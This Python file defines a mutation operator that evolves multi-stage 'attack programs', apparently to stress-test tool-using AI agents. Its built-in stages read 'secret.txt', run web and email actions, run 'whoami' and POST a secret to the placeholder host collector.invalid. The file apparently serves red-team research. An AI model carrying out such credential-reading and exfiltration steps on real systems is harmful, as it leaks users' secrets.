from __future__ import annotations

import random
from dataclasses import dataclass, field

from asip.compiler.attack_instruction import AttackInstruction, AttackStage
from asip.compiler.attack_program import AttackProgram
from asip.evolution.payload_mutator import PayloadMutator
from asip.evolution.stage_mutator import StageMutator


@dataclass(slots=True)
class ProgramMutator:
    """
    Mutates full AttackProgram ASTs.

    This is the top-level structured mutation operator.
    It preserves compiler compatibility while changing program shape.
    """

    random_seed: int = 42
    max_stages: int = 8

    stage_mutator: StageMutator = field(default_factory=StageMutator)
    payload_mutator: PayloadMutator = field(default_factory=PayloadMutator)

    rng: random.Random = field(init=False)

    INSERTABLE_STAGES: tuple[AttackStage, ...] = (
        AttackStage(
            name="credential_access",
            instructions=[
                AttackInstruction(opcode="READ_FILE", target="secret.txt"),
            ],
        ),
        AttackStage(
            name="web_context",
            instructions=[
                AttackInstruction(opcode="WEB_SEARCH", value="system maintenance"),
                AttackInstruction(opcode="WEB_OPEN"),
            ],
        ),
        AttackStage(
            name="email_context",
            instructions=[
                AttackInstruction(opcode="EMAIL_READ"),
            ],
        ),
        AttackStage(
            name="exfiltration",
            instructions=[
                AttackInstruction(
                    opcode="POST",
                    target="https://collector.invalid/upload",
                    variable="secret",
                ),
            ],
        ),
        AttackStage(
            name="verification",
            instructions=[
                AttackInstruction(opcode="SHELL_RUN", value="whoami"),
            ],
        ),
        AttackStage(
            name="delay",
            instructions=[
                AttackInstruction(opcode="WAIT", value="5"),
            ],
        ),
    )

    def __post_init__(self) -> None:
        self.rng = random.Random(self.random_seed)

    def mutate(self, program: AttackProgram) -> AttackProgram:
        mutation = self.rng.choice(
            (
                self.mutate_stage,
                self.insert_stage,
                self.delete_stage,
                self.swap_stages,
                self.duplicate_stage,
                self.payload_mutation,
            )
        )

        mutated = mutation(program)

        mutated.metadata["program_mutation"] = mutation.__name__
        mutated.metadata["mutated_from"] = program.program_id

        return mutated

    def mutate_stage(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        if not stages:
            return self.insert_stage(program)

        index = self.rng.randrange(len(stages))
        stages[index] = self.stage_mutator.mutate(stages[index])

        return self._clone(program, stages)

    def insert_stage(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        if len(stages) >= self.max_stages:
            return self.mutate_stage(program)

        stage = self._copy_stage(
            self.rng.choice(self.INSERTABLE_STAGES)
        )

        index = self.rng.randrange(len(stages) + 1)
        stages.insert(index, stage)

        return self._clone(program, stages)

    def delete_stage(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        if len(stages) <= 1:
            return self.mutate_stage(program)

        index = self.rng.randrange(len(stages))
        stages.pop(index)

        return self._clone(program, stages)

    def swap_stages(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        if len(stages) < 2:
            return self.mutate_stage(program)

        i, j = self.rng.sample(range(len(stages)), 2)
        stages[i], stages[j] = stages[j], stages[i]

        return self._clone(program, stages)

    def duplicate_stage(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        if not stages:
            return self.insert_stage(program)

        if len(stages) >= self.max_stages:
            return self.mutate_stage(program)

        stage = self._copy_stage(self.rng.choice(stages))
        index = self.rng.randrange(len(stages) + 1)
        stages.insert(index, stage)

        return self._clone(program, stages)

    def payload_mutation(self, program: AttackProgram) -> AttackProgram:
        stages = self._copy_stages(program.stages)

        candidate_instructions: list[tuple[int, int]] = []

        for stage_index, stage in enumerate(stages):
            for instruction_index, _ in enumerate(stage.instructions):
                candidate_instructions.append((stage_index, instruction_index))

        if not candidate_instructions:
            return self.mutate_stage(program)

        stage_index, instruction_index = self.rng.choice(candidate_instructions)

        stages[stage_index].instructions[instruction_index] = (
            self.payload_mutator.mutate(
                stages[stage_index].instructions[instruction_index]
            )
        )

        return self._clone(program, stages)

    def _clone(
        self,
        program: AttackProgram,
        stages: list[AttackStage],
    ) -> AttackProgram:
        return AttackProgram(
            name=program.name,
            goal=program.goal,
            stages=stages,
            metadata=dict(program.metadata),
        )

    @classmethod
    def _copy_stages(
        cls,
        stages: list[AttackStage],
    ) -> list[AttackStage]:
        return [
            cls._copy_stage(stage)
            for stage in stages
        ]

    @staticmethod
    def _copy_stage(
        stage: AttackStage,
    ) -> AttackStage:
        return AttackStage(
            name=stage.name,
            instructions=[
                AttackInstruction(
                    opcode=instruction.opcode,
                    target=instruction.target,
                    variable=instruction.variable,
                    value=instruction.value,
                    transform=instruction.transform,
                    metadata=dict(instruction.metadata),
                )
                for instruction in stage.instructions
            ],
            metadata=dict(stage.metadata),
        )